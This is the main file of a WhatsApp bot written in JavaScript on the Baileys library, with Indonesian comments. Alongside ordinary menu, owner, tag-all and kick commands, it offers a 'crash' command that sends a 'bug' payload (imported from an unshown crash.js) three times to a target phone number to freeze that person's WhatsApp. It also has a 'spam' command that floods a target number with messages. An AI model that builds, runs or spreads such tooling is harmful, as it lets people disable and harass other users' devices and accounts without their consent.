// index.js - FIXED: NO DATABASE, FIX CRASH, FIX HIDETAG, FIX OWNER
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers, delay } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
const pino = require('pino');
const fs = require('fs');
const config = require('./config.js');
const readline = require('readline');
const chalk = require('chalk');

// Import functions
const { xeoninvisible } = require('./lib/crash.js');
const { showMenu } = require('./handler/menu.js');
const { spamMassal } = require('./lib/attack.js');

let sock = null;
let rl = null;

// === INPUT NOMOR ===
async function askPhoneNumber() {
  if (!rl) {
    rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  }
  const question = (text) => new Promise((resolve) => rl.question(text, resolve));
  console.log(chalk.red.bold('\n╔════════════════════════════════════════╗'));
  console.log(chalk.red.bold('║   🚀 DARKFROSTWOLF BOT - PUBLIC v3.0   ║'));
  console.log(chalk.red.bold('╚════════════════════════════════════════╝'));
  return await question(chalk.yellow('\n📱 Masukkan Nomor Bot (62xxx): '));
}

// === KONEKSI ===
async function connectToWhatsApp() {
  const { state, saveCreds } = await useMultiFileAuthState(config.sessionName);
  
  const socketConfig = {
    auth: state,
    logger: pino({ level: 'silent' }),
    browser: Browsers.ubuntu('Chrome'),
    markOnlineOnConnect: true,
    printQRInTerminal: false,
  };
  
  if (config.connectionMethod === 'pairing' && !state.creds.registered) {
    const phoneNumber = await askPhoneNumber();
    sock = makeWASocket(socketConfig);
    
    setTimeout(async () => {
        try {
            let code = await sock.requestPairingCode(phoneNumber);
            code = code?.match(/.{1,4}/g)?.join("-") || code;
            console.log(chalk.greenBright.bold(`\n🔑 KODE PAIRING: ${code}\n`));
        } catch (err) {
            console.log(chalk.red('❌ Gagal request kode. Coba lagi.'));
        }
    }, 3000);
  } else {
    sock = makeWASocket(socketConfig);
  }

  sock.ev.on('creds.update', saveCreds);
  
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    if (qr && config.connectionMethod === 'qr') qrcode.generate(qr, { small: true });
    
    if (connection === 'open') {
      console.log(chalk.green('\n✅ BOT SIAP! (Mode: Public - No Database)'));
    }
    
    if (connection === 'close') {
      const reason = lastDisconnect.error?.output?.statusCode;
      if (reason === DisconnectReason.loggedOut) {
          console.log(chalk.red('⛔ Logged Out. Hapus folder session.'));
          process.exit(1);
      } else {
          connectToWhatsApp();
      }
    }
  });
  
  // === MESSAGE HANDLER ===
  sock.ev.on('messages.upsert', async (m) => {
    try {
        const msg = m.messages[0];
        if (!msg.message) return;

        // Ambil text pesan
        const text = msg.message.conversation || 
                     msg.message.extendedTextMessage?.text || 
                     msg.message.imageMessage?.caption || '';
        
        if (!text.startsWith(config.botPrefix)) return;

        // Definisi Variabel
        const chatId = msg.key.remoteJid;
        const isGroup = chatId.endsWith('@g.us');
        const sender = isGroup ? (msg.key.participant || chatId) : chatId;
        const senderNumber = sender.split('@')[0].split(':')[0].replace(/\D/g, '');
        
        const command = text.slice(config.botPrefix.length).trim().split(' ')[0].toLowerCase();
        const args = text.slice(config.botPrefix.length + command.length).trim().split(' ');
        const pushname = msg.pushName || 'User';

        console.log(chalk.cyan(`📨 ${command} | Dari: ${senderNumber}`));

        // === FITUR DIMULAI DI SINI ===

        // 1. MENU
        if (command === 'menu') {
            await showMenu(sock, chatId, pushname);
        }

        // 2. OWNER (FIXED CONTACT)
        else if (command === 'owner') {
            const vcard = 'BEGIN:VCARD\n' + 
                          'VERSION:3.0\n' + 
                          `FN:${config.ownerName}\n` + // Nama Owner
                          `TEL;type=CELL;type=VOICE;waid=${config.ownerNumber}:${config.ownerNumber}\n` + 
                          'END:VCARD';

            await sock.sendMessage(chatId, { 
                contacts: { 
                    displayName: config.ownerName, 
                    contacts: [{ vcard }] 
                }
            });
            await sock.sendMessage(chatId, { text: 'Itu nomor owner saya, jangan disepam ya kak!' });
        }

        // 3. CRASH (FIXED)
        else if (command === 'crash') {
            if (!args[0]) return sock.sendMessage(chatId, { text: `Format: ${config.botPrefix}crash 628xxx` });
            
            const target = args[0].replace(/\D/g, '');
            await sock.sendMessage(chatId, { text: `☠️ MENGIRIM BUG KE ${target}...` });

            try {
                // Loop sesuai setting di config, default 3x kalau user ga masukin jumlah
                const repeat = 3; 
                for (let i = 0; i < repeat; i++) {
                    await xeoninvisible(sock, target);
                    console.log(chalk.red(`[💥] Hit ${i+1}/${repeat}`));
                    await delay(2000); // Delay wajib biar ga error network
                }
                await sock.sendMessage(chatId, { text: `✅ SUKSES! Target ${target} kemungkinan freeze.` });
            } catch (err) {
                console.log(err);
                await sock.sendMessage(chatId, { text: '❌ Gagal mengirim crash (Error Network/Baileys).' });
            }
        }

        // 4. SPAM (FIXED)
        else if (command === 'spam') {
            if (args.length < 3) return sock.sendMessage(chatId, { text: `Format: ${config.botPrefix}spam 628xxx 10 P` });
            const target = args[0];
            const count = parseInt(args[1]);
            const pesan = args.slice(2).join(' ');

            await sock.sendMessage(chatId, { text: `🚀 Mengirim ${count} spam...` });
            await spamMassal(sock, target, count, pesan);
            await sock.sendMessage(chatId, { text: '✅ Spam selesai.' });
        }

        // 5. HIDETAG (FIXED)
        else if (command === 'hidetag' || command === 'tagall') {
            if (!isGroup) return sock.sendMessage(chatId, { text: '❌ Khusus Grup!' });
            
            // Ambil pesan setelah command
            const pesan = args.join(' ') || 'Halo semua!';
            
            // Ambil metadata grup
            const metadata = await sock.groupMetadata(chatId);
            const participants = metadata.participants.map(v => v.id);

            // Kirim pesan dengan mention semua orang
            await sock.sendMessage(chatId, { 
                text: pesan, 
                mentions: participants 
            });
        }

        // 6. KICK
        else if (command === 'kick') {
            if (!isGroup) return sock.sendMessage(chatId, { text: '❌ Khusus Grup!' });
            let target;
            
            if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
                target = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
            } else if (msg.message.extendedTextMessage?.contextInfo?.participant) {
                // Support reply pesan target
                target = msg.message.extendedTextMessage.contextInfo.participant;
            } else {
                return sock.sendMessage(chatId, { text: 'Tag orangnya atau reply chatnya!' });
            }

            try {
                await sock.groupParticipantsUpdate(chatId, [target], 'remove');
                await sock.sendMessage(chatId, { text: '👋 Dadah beban grup!' });
            } catch (e) {
                await sock.sendMessage(chatId, { text: '❌ Gagal kick (Jadikan bot admin dulu!)' });
            }
        }

    } catch (error) {
        console.error('Handler Error:', error);
    }
  });
  
  return sock;
}

// Start bot
connectToWhatsApp();
